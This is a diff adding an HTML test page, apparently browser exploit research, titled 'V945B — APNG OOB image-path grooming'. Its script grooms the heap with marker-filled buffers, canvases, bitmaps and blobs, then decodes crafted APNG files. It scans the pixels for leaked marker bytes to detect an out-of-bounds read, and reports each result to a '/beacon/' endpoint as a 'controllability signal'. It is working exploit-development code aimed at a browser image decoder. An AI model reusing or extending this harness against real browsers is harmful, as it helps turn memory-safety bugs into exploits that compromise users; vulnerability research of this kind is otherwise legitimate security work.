@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V945B</title></head>
+<body><pre id="out">V945B — APNG OOB image-path grooming (B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V945B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,600))+'&t='+Date.now()+'&s=1';}catch(e){}
+}
+function hx(n){ var s=n.toString(16); return s.length<2?'0'+s:s; }
+function p32(d,w,x,y){ var i=(y*w+x)*4; return hx(d[i])+hx(d[i+1])+hx(d[i+2])+hx(d[i+3]); }
+function loadImg(src,n){ return new Promise(function(res,rej){ var im=new Image(); im.onload=function(){res(im)}; im.onerror=function(){rej(new Error('load-fail'))}; im.src=src+'?cb='+Date.now()+'_'+n+'_'+Math.random(); }); }
+var keep=[];
+function fillMarker(u8,a,b,c,d){ for(var j=0;j+3<u8.length;j+=4){ u8[j]=a; u8[j+1]=b; u8[j+2]=c; u8[j+3]=d; } }
+async function groom(){
+  keep=[];
+  for(var i=0;i<40;i++){
+    var ab=new ArrayBuffer(4096+((i%5)*1024)); fillMarker(new Uint8Array(ab),0x41,0x42,0x43,0x44); keep.push(ab);
+  }
+  for(var i=0;i<30;i++){
+    var c=document.createElement('canvas'); c.width=64; c.height=64;
+    var ctx=c.getContext('2d');
+    var id=ctx.createImageData(64,64); fillMarker(id.data,0xAA,0xBB,0xCC,0xDD); ctx.putImageData(id,0,0);
+    keep.push(c);
+    try{ var bm=await createImageBitmap(c); keep.push(bm); }catch(e){}
+  }
+  for(var i=0;i<20;i++){
+    var ab=new ArrayBuffer(8192); fillMarker(new Uint8Array(ab),0x11,0x22,0x33,0x44);
+    try{ keep.push(new Blob([ab],{type:'application/octet-stream'})); }catch(e){ keep.push(ab); }
+  }
+  bk('GROOM','abABCD=40,canvas+bitmapAABBCCDD=30,blob11223344=20');
+}
+function scan(name,src,iter){
+  return loadImg(src,iter).then(function(im){
+    var c=document.createElement('canvas'); c.width=64; c.height=64;
+    var ctx=c.getContext('2d'); ctx.clearRect(0,0,64,64); ctx.drawImage(im,0,0);
+    var d=ctx.getImageData(0,0,64,64).data;
+    var rows=[0,1,2,15], m1=0,m2=0,m3=0,non=0,samples=[];
+    for(var ri=0;ri<rows.length;ri++){
+      var y=rows[ri];
+      for(var x=16;x<=30;x+=2){
+        var lo=p32(d,64,x,y), hi=p32(d,64,x+1,y), q=lo+hi;
+        if(q.indexOf('41424344')!==-1) m1++;
+        if(q.indexOf('aabbccdd')!==-1) m2++;
+        if(q.indexOf('11223344')!==-1) m3++;
+        if(q!=='0000000000000000' && q!=='aeaeaeafaeaeaeaf' && lo!=='00ff00ff' && lo!=='ff0000ff') { non++; if(samples.length<5) samples.push('y'+y+'x'+x+'='+q); }
+      }
+    }
+    bk('SCAN',name+'#'+iter+'|ABCD='+m1+'|AABBCCDD='+m2+'|11223344='+m3+'|non='+non+'|s='+samples.join(','));
+    say('SCAN '+name+'#'+iter+' ABCD='+m1+' AABBCCDD='+m2+' 11223344='+m3+' non='+non);
+  }).catch(function(e){ bk('T-ERR',name+'#'+iter+'|'+String(e&&e.message||e).slice(0,120)); });
+}
+(async function(){
+  bk('BOOT','image-path groom test');
+  await scan('base-off0','v940b_off0.apng',0);
+  await groom();
+  await scan('groom-off0','v940b_off0.apng',1);
+  await scan('groom-off2','v940b_off2.apng',1);
+  await scan('groom-off0','v940b_off0.apng',2);
+  bk('DONE','complete|note=any marker hit => controllability signal');
+  say('\nV945B complete.');
+})();
+</script>
+</body></html>
